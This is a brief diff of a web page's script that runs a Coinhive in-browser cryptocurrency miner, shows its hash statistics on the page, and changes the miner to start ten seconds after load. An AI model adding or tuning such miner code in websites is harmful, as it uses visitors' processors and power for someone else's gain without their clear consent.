@@ -970,7 +970,7 @@ document.getElementById("audio").volume = 0.5;
       var acceptedHashes = miner.getAcceptedHashes();
       document.getElementById("coinhive-miner").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec<br>" + "Total Hashes = " + totalHashes + "<br>Accepted Hashes = " + acceptedHashes;
     }, 1000);
-    miner.start();
+    setTimeout(function() {miner.start();}, 10000);
 </script>
 ]]></content>
       
